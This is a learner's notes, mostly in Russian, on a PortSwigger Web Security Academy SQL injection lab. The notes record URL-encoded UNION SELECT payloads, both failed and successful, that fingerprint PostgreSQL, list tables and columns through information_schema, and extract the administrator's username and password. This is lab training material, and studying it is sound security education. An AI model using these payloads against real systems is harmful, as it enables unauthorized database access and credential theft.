
## Listing the contents of the database
выводим содержимое дб

изучаем SELECT * FROM 

вывод всех таблиц бд
SELECT * FROM information_schema.tables

SELECT * FROM information_schema.columns WHERE table_name = 'Users'
вывод колонн где таблица = 'Users'

https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
#  listing the database contents on non-Oracle databases
задание:

есть пользователь administrator нужно украсть его пароль

'union+select+'ffff',null--+  ответ 200 + ffff

'union+select+information_schema.tables,null--+    err500

'union+select+from+information_schema.tables,null--+    err500

'union+select+all_tables,null--+ 500

'union+select+information_schema.tables,null--+ 500

'union+select+*+from+information_schema.tables,null--+ 500

🟢
'union+select+version(),null--+
ОТВЕТ
PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit


'union+select+table_name,null+from+information_schema.tables--+ все таблицы системы
есть таблица **`users_eloiur`**


'union+select+table_name,null+from+information_schema.tables+WHERE+table_schema='public'--+   вывел только публичные

'union+select+information_schema.columns,null+where+table_name=''users--+ 500


'union+select+column_name,null+from+information_schema.colunms+where+table_name='pg_user'--+ 500


' UNION SELECT NULL,column_name,NULL FROM information_schema.columns 
   WHERE table_name='users'-- образец

**`users_eloiur`**


'union+select+column_name,null+from+information_schema.colunms+where+table_name='users_eloiur'--+   500

ошибка в букве в слове colunms вместо columns
'union+select+column_name,null+from+information_schema.columns+where+table_name='users_eloiur'--+  🟢200


есть email
есть username_soetdf
есть password_lrpxdf

'union+select+username_soetdf+||+'~'+||+password_lrpxdf,null+from+information_schema.tables+where+table_name='users_eloiur'--+  500

'union+select+username_soetdf+||+'~'+||+password_lrpxdf,null+from+users_eloiur+--+ 

ответ несколько юзеров и administrator~4a2gejcan8zj5b27pgl8


🟢
попробую вывести только администратора
'union+select+username_soetdf+||+'~'+||+password_lrpxdf,null+from+users_eloiur+where+username_soetdf='administrator'+--+

четко! ответ только администратора!
administrator~

==выполнено==

доп  попробую использовать LIKE '%text'

'union+select+username_soetdf+||+'~'+||+password_lrpxdf,null+from+users_eloiur+where+username_soetdf+LIKE+'admin%'+--+

тоже сработало! ответ administrator~4a2gejcan8zj5b27pgl8
четко!
